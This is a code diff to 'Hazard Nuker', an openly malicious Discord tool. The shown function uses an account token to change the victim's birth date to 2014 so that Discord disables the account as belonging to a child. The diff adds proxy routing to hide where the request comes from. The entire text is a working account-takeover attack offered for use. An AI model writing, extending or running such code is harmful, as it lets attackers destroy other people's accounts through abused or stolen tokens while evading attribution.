@@ -2,16 +2,15 @@
 # Hazard Nuker under the GNU General Public Liscense v2 (1991).
 
 import requests
-import json
 import Hazard
 
 from colorama import Fore
 
-from util.plugins.common import getheaders
+from util.plugins.common import getheaders, proxy
 
 def TokenDisable(token):
     #change their age to below 13 years old which is against tos which disables their account
-    res = requests.patch('https://discordapp.com/api/v9/users/@me', headers=getheaders(token), json={'date_of_birth': '2014-2-11'})
+    res = requests.patch('https://discordapp.com/api/v9/users/@me', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={'date_of_birth': '2014-2-11'})
 
     if res.status_code == 400:
         res_message = res.json().get('date_of_birth', ['no response message'])[0]
@@ -24,5 +23,5 @@ def TokenDisable(token):
             print(f'Unknown response: {res_message}')
     else:
         print('Failed to disable account')
-    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.LIGHTRED_EX}')
+    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
     Hazard.main()
